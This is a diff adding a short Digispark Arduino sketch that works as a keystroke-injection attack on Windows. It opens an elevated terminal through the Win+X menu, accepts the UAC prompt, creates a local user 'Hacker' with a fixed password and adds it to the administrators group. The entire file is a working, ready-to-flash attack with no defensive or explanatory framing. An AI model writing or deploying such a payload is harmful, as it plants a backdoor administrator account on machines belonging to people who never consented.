@@ -1,0 +1,28 @@
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_A);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.print("net user /add Hacker 12345678");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("net localgroup administrators Hacker /add");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for (;;) {
+    /*empty*/
+  }
+}
